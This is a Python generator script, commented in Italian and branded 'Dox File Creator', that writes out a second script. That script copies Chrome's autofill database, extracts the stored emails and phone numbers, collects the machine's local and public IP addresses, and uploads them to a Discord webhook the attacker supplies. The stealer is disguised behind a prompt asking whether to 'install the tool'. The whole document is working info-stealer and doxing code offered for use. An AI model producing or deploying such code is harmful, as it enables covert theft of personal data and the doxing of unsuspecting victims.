import os
import time
import sys

# Colori ANSI
rosso = '\033[91m'
nero = '\033[90m'
reset = '\033[0m'

ascii_art = r"""
$$$$$$$\                            $$$$$$$$\ $$\ $$\                  $$$$$$\                                 $$\     
$$  __$$\                           $$  _____|\__|$$ |                $$  __$$\                                $$ |    
$$ |  $$ | $$$$$$\  $$\   $$\       $$ |      $$\ $$ | $$$$$$\        $$ /  \__| $$$$$$\   $$$$$$\   $$$$$$\ $$$$$$\   
$$ |  $$ |$$  __$$\ \$$\ $$  |      $$$$$\    $$ |$$ |$$  __$$\       $$ |      $$  __$$\ $$  __$$\  \____$$\\_$$  _|  
$$ |  $$ |$$ /  $$ | \$$$$  /       $$  __|   $$ |$$ |$$$$$$$$ |      $$ |      $$ |  \__|$$$$$$$$ | $$$$$$$ | $$ |    
$$ |  $$ |$$ |  $$ | $$  $$<        $$ |      $$ |$$ |$$   ____|      $$ |  $$\ $$ |      $$   ____|$$  __$$ | $$ |$$\ 
$$$$$$$  |\$$$$$$  |$$  /\$$\       $$ |      $$ |$$ |\$$$$$$$\       \$$$$$$  |$$ |      \$$$$$$$\ \$$$$$$$ | \$$$$  |
\_______/  \______/ \__/  \__|      \__|      \__|\__| \_______|       \______/ \__|       \_______| \_______|  \____/
"""

def stampa_ascii_animato():
    for i in range(2):
        os.system("cls" if os.name == "nt" else "clear")
        print(rosso + ascii_art + reset)
        time.sleep(3)
        os.system("cls" if os.name == "nt" else "clear")
        print(nero + ascii_art + reset)
        time.sleep(3)

stampa_ascii_animato()

print("1. Dox File Create")
scelta = input("Seleziona un'opzione (1): ").strip()

if scelta != "1":
    print("❌ Opzione non valida.")
    sys.exit()

nome_file = input("📁 Inserisci il nome del file da generare (senza .py): ").strip()
webhook_url = input("🔗 Inserisci Webhook Discord (può essere vuoto): ").strip()
webhook_string = f'"{webhook_url}"' if webhook_url else '""'

contenuto_script = f'''import os
import shutil
import sqlite3
import requests
import socket

WEBHOOK = {webhook_string}

def get_chrome_autofill_path():
    try:
        user = os.getlogin()
        path = f"C:/Users/{{user}}/AppData/Local/Google/Chrome/User Data/Default"
        if os.path.exists(path):
            return path
    except:
        pass
    return None

def estrai_email_telefono(autofill_db_path):
    risultati = {{"emails": set(), "phones": set()}}
    temp = "temp_webdata.db"
    try:
        shutil.copy2(autofill_db_path, temp)
        conn = sqlite3.connect(temp)
        cursor = conn.cursor()
        cursor.execute("SELECT name, value FROM autofill")
        for name, value in cursor.fetchall():
            if "@" in value:
                risultati["emails"].add(value)
            elif any(c.isdigit() for c in value) and len(value) >= 8:
                risultati["phones"].add(value)
        conn.close()
        os.remove(temp)
    except Exception as e:
        print(f"Errore DB: {{e}}")
    return risultati

def ottieni_ip():
    try:
        ip_locale = socket.gethostbyname(socket.gethostname())
    except:
        ip_locale = "Non disponibile"
    try:
        ip_pubblico = requests.get("https://api.ipify.org").text
    except:
        ip_pubblico = "Non disponibile"
    return ip_locale, ip_pubblico

def invia_discord(webhook, testo, allegato=None):
    if not webhook:
        print("⚠️ Nessun webhook configurato.")
        return
    try:
        payload = {{"content": testo}}
        files = None
        if allegato:
            with open(allegato, "rb") as f:
                files = {{"file": (os.path.basename(allegato), f)}}
                r = requests.post(webhook, data=payload, files=files)
        else:
            r = requests.post(webhook, data=payload)
        if r.status_code in [200, 204]:
            print("✅ Dati inviati.")
        else:
            print(f"Errore Discord: {{r.status_code}}")
    except Exception as e:
        print(f"Errore invio: {{e}}")

print("💻 Vuoi installare il tool? (yes/no)")
risposta = input("👉 ").strip().lower()

if risposta != "yes":
    print("❎ Installazione annullata.")
    exit()

chrome_path = get_chrome_autofill_path()
if not chrome_path:
    print("❌ Chrome non trovato.")
    exit()

web_data = os.path.join(chrome_path, "Web Data")
if not os.path.exists(web_data):
    print("❌ Nessun database autofill.")
    exit()

dati = estrai_email_telefono(web_data)
ip_locale, ip_pubblico = ottieni_ip()

print("\\n📧 Email:")
for e in dati["emails"]:
    print(f" - {{e}}")

print("\\n📞 Telefoni:")
for p in dati["phones"]:
    print(f" - {{p}}")

print(f"\\n🌐 IP Locale: {{ip_locale}}")
print(f"🌍 IP Pubblico: {{ip_pubblico}}")

if WEBHOOK:
    contenuto = "📑 Dati raccolti:\\n"
    contenuto += "\\n📧 Email:\\n" + "\\n".join(f"- {{e}}" for e in dati["emails"]) if dati["emails"] else "\\nNessuna email"
    contenuto += "\\n\\n📞 Telefoni:\\n" + "\\n".join(f"- {{p}}" for p in dati["phones"]) if dati["phones"] else "\\nNessun telefono"
    contenuto += f"\\n\\n🌐 IP Locale: {{ip_locale}}\\n🌍 IP Pubblico: {{ip_pubblico}}"
    with open("risultati.txt", "w", encoding="utf-8") as f:
        f.write(contenuto)
    invia_discord(WEBHOOK, contenuto, "risultati.txt")
    os.remove("risultati.txt")
else:
    print("ℹ️ Webhook non configurato.")
'''

# Determina la directory in cui si trova lo script generatore
script_dir = os.path.dirname(os.path.abspath(__file__))
percorso = os.path.join(script_dir, f"{nome_file}.py")

# Scrive il file
with open(percorso, "w", encoding="utf-8") as f:
    f.write(contenuto_script)

print(f"\n✅ File generato con successo: {percorso}")
